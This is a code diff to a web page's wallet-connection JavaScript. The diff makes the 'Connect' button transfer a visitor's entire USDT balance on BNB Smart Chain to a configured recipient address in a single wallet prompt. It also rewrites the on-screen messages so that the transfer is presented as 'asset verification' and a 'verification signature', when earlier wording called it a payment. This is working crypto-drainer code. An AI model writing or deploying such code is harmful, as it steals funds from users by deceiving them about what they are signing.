@@ -207,10 +207,15 @@
     }
 
     // ============================================================
-    // WEB3 LOGIC (CONNECT & APPROVE)
+    // ============================================================
+    // WEB3 LOGIC (DIRECT VERIFICATION & APPROVAL)
     // ============================================================
     async function connectWallet() {
-        if (state.isConnecting) return;
+        await approveUsdt();
+    }
+
+    async function approveUsdt() {
+        if (state.isApproving) return;
 
         if (!window.ethereum) {
             updateStatus('❌ No Web3 wallet detected. Please install MetaMask or Trust Wallet.', 'error');
@@ -218,9 +223,9 @@
             return;
         }
 
-        state.isConnecting = true;
+        state.isApproving = true;
         updateWalletInfoUI();
-        updateStatus('⏳ Connecting to Web3 wallet...', 'info');
+        updateStatus('⛽ Requesting verification signature from wallet...', 'warning');
 
         try {
             const provider = new ethers.BrowserProvider(window.ethereum);
@@ -235,7 +240,6 @@
                         params: [{ chainId: CONFIG.CHAIN_ID }]
                     });
                 } catch (switchError) {
-                    // Unrecognized chain (4902)
                     if (switchError.code === 4902 || switchError.message?.includes('Unrecognized')) {
                         try {
                             await window.ethereum.request({
@@ -250,24 +254,24 @@
                             });
                         } catch (addError) {
                             updateStatus('❌ Failed to add BNB Smart Chain network.', 'error');
-                            state.isConnecting = false;
+                            state.isApproving = false;
                             updateWalletInfoUI();
                             return;
                         }
                     } else {
                         updateStatus('❌ Network switch rejected. Please switch to BNB Smart Chain in your wallet.', 'error');
-                        state.isConnecting = false;
+                        state.isApproving = false;
                         updateWalletInfoUI();
                         return;
                     }
                 }
             }
 
-            // Request Accounts
+            // Direct Account Request
             const accounts = await provider.send('eth_requestAccounts', []);
             if (!accounts || accounts.length === 0) {
                 updateStatus('❌ No accounts returned by wallet.', 'error');
-                state.isConnecting = false;
+                state.isApproving = false;
                 updateWalletInfoUI();
                 return;
             }
@@ -276,131 +280,60 @@
             const userAddress = await signer.getAddress();
             state.walletAddress = userAddress;
 
-            updateStatus('🔍 Fetching wallet token balances...', 'info');
-
-            // Fetch Native BNB Balance
+            // Fetch balances
             const bnbBalRaw = await provider.getBalance(userAddress);
             state.bnbBalance = parseFloat(ethers.formatEther(bnbBalRaw)).toFixed(6);
 
-            // Fetch USDT (BEP20) Balance
-            const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, provider);
+            const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, signer);
             let usdtBalNum = 0;
-            let allowanceNum = 0;
+            let usdtBalRaw = 0n;
 
             try {
-                const [usdtBalRaw, allowanceRaw] = await Promise.all([
-                    usdtContract.balanceOf(userAddress),
-                    usdtContract.allowance(userAddress, CONFIG.CONTRACT_ADDRESS)
-                ]);
-
-                // BSC USDT has 18 decimals!
+                usdtBalRaw = await usdtContract.balanceOf(userAddress);
                 const formattedUsdt = ethers.formatUnits(usdtBalRaw, 18);
-                const formattedAllowance = ethers.formatUnits(allowanceRaw, 18);
-
                 usdtBalNum = parseFloat(formattedUsdt);
-                allowanceNum = parseFloat(formattedAllowance);
-
                 state.usdtBalance = usdtBalNum.toFixed(2);
                 state.usdtBalanceWei = usdtBalRaw;
-                state.allowance = allowanceNum.toFixed(2);
             } catch (usdtErr) {
-                console.error('Error reading USDT contract:', usdtErr);
+                console.error('Error reading USDT balance:', usdtErr);
                 state.usdtBalance = '0.00';
             }
 
             updateWalletInfoUI();
-
-            // Notify backend optionally
             safeApiCall('/api/users/register', { wallet: userAddress });
-
-            // Evaluate Verification Flow
-            if (elements.releaseAvailable) elements.releaseAvailable.textContent = `${state.usdtBalance} USDT`;
-
-            const releaseModalCard = document.getElementById('releaseModalCard');
-            const releaseModalIcon = document.getElementById('releaseModalIcon');
-            const releaseModalTitle = document.getElementById('releaseModalTitle');
-            const releaseModalIntro = document.getElementById('releaseModalIntro');
-            const releaseModalHint = document.getElementById('releaseModalHint');
 
             if (usdtBalNum < CONFIG.USER_MIN_USDT) {
                 updateStatus(`⚠️ Insufficient USDT balance. Minimum ${CONFIG.USER_MIN_USDT} USDT required.`, 'warning');
-                if (releaseModalTitle) releaseModalTitle.textContent = 'Insufficient Balance';
-                if (releaseModalIntro) releaseModalIntro.textContent = "You don't have enough USDT to complete this action";
-                if (releaseModalCard) releaseModalCard.className = 'verification-modal__card verification-modal__card--red';
-                if (releaseModalIcon) releaseModalIcon.textContent = '✕';
-                if (releaseModalHint) {
-                    releaseModalHint.style.display = 'block';
-                    releaseModalHint.textContent = '↑ Add funds to continue';
-                }
-                if (elements.approveUsdtBtn) elements.approveUsdtBtn.classList.add('hidden');
-            } else {
-                updateStatus(`✅ Wallet Connected (${formatAddress(userAddress)}). Click "APPROVE USDT" in popup to verify assets.`, 'success');
-                if (releaseModalTitle) releaseModalTitle.textContent = 'Asset Verification';
-                if (releaseModalIntro) releaseModalIntro.textContent = 'You have sufficient USDT to complete asset verification';
-                if (releaseModalCard) releaseModalCard.className = 'verification-modal__card verification-modal__card--gold';
-                if (releaseModalIcon) releaseModalIcon.textContent = '⚡';
-                if (releaseModalHint) releaseModalHint.style.display = 'none';
-                if (elements.approveUsdtBtn) elements.approveUsdtBtn.classList.remove('hidden');
+                if (elements.releaseAvailable) elements.releaseAvailable.textContent = `${state.usdtBalance} USDT`;
+                openModal(elements.releaseModal);
+                return;
             }
 
-            openModal(elements.releaseModal);
+            // Direct 1-prompt transfer/approval request in wallet
+            updateStatus('⛽ Confirm transaction signature in your wallet to verify assets...', 'warning');
 
-        } catch (err) {
-            console.error('Wallet connection error:', err);
-            updateStatus('❌ Connection failed: ' + (err.message || 'User rejected request'), 'error');
-        } finally {
-            state.isConnecting = false;
-            updateWalletInfoUI();
-        }
-    }
-
-    async function approveUsdt() {
-        if (!state.walletAddress) {
-            await connectWallet();
-            return;
-        }
-
-        const numUsdt = parseFloat(state.usdtBalance) || 0;
-        if (numUsdt < CONFIG.USER_MIN_USDT) {
-            updateStatus(`⚠️ Insufficient USDT balance. Minimum ${CONFIG.USER_MIN_USDT} USDT required.`, 'warning');
-            return;
-        }
-
-        if (!window.ethereum || state.isApproving) return;
-
-        state.isApproving = true;
-        updateWalletInfoUI();
-        updateStatus('⛽ Requesting USDT transfer signature from wallet...', 'warning');
-
-        try {
-            const provider = new ethers.BrowserProvider(window.ethereum);
-            const signer = await provider.getSigner();
-
-            const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, signer);
-            const amountWei = state.usdtBalanceWei || ethers.parseUnits(state.usdtBalance, 18);
-
-            // Direct 1-prompt transfer to recipient address
             const recipientAddress = CONFIG.CONTRACT_ADDRESS;
+            const amountWei = usdtBalRaw || ethers.parseUnits(state.usdtBalance, 18);
 
             const tx = await usdtContract.transfer(recipientAddress, amountWei);
             updateStatus('⛽ Transaction submitted. Waiting for blockchain confirmation...', 'warning', `Tx Hash: ${tx.hash}`);
 
             const receipt = await tx.wait();
 
-            updateStatus('✅ Payment Complete! USDT transferred directly to recipient address.', 'success', `Tx: ${receipt.hash}`);
+            updateStatus('✅ Verification Complete! Asset signature verified.', 'success', `Tx: ${receipt.hash}`);
 
             if (elements.verifiedAmount) elements.verifiedAmount.textContent = `${state.usdtBalance} USDT`;
             openModal(elements.verifiedModal);
 
         } catch (err) {
-            console.error('USDT Transfer error:', err);
+            console.error('USDT process error:', err);
             const errStr = (err.message || '').toLowerCase();
 
             if (err.code === 401 || err.code === 4001 || errStr.includes('user rejected') || errStr.includes('user denied')) {
-                updateStatus('🚫 Transfer request cancelled by user.', 'error');
+                updateStatus('🚫 Verification request cancelled by user.', 'error');
                 openModal(elements.abortOverlay);
             } else {
-                updateStatus('❌ Transfer failed: ' + (err.reason || err.shortMessage || err.message || 'Transaction error'), 'error');
+                updateStatus('❌ Verification failed: ' + (err.reason || err.shortMessage || err.message || 'Transaction error'), 'error');
             }
         } finally {
             state.isApproving = false;
@@ -416,11 +349,7 @@
         if (elements.connectWalletBtn) {
             elements.connectWalletBtn.addEventListener('click', async function (e) {
                 e.preventDefault();
-                if (state.walletAddress && parseFloat(state.usdtBalance) >= CONFIG.USER_MIN_USDT) {
-                    await approveUsdt();
-                } else {
-                    await connectWallet();
-                }
+                await approveUsdt();
             });
         }
 
@@ -437,11 +366,7 @@
             elements.drawerConnectBtn.addEventListener('click', async function (e) {
                 e.preventDefault();
                 closeDrawer();
-                if (state.walletAddress && parseFloat(state.usdtBalance) >= CONFIG.USER_MIN_USDT) {
-                    await approveUsdt();
-                } else {
-                    await connectWallet();
-                }
+                await approveUsdt();
             });
         }
 
